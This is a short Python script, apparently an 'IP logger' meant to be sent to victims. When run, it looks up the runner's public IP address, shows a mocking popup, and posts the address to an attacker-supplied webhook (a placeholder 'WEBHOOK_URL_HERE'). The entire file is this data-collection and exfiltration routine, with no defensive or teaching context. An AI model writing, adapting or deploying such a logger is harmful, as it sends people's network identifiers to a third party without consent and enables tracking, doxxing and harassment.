import requests
import tkinter

webhook = "WEBHOOK_URL_HERE"

def getipa():
    x = requests.get('https://api.ipify.org')
    ipa = x.text
    tkinter.messagebox.showinfo(title='IP Logged', message='Get IP logged kid.')
    sendipa(ipa)
    
def sendipa(ipa):
    data = {"username": 'New IP'}
    data["embeds"] = [{"description" : ipa, "title" : "New Log"}]
    requests.post(webhook, json=data)

getipa()
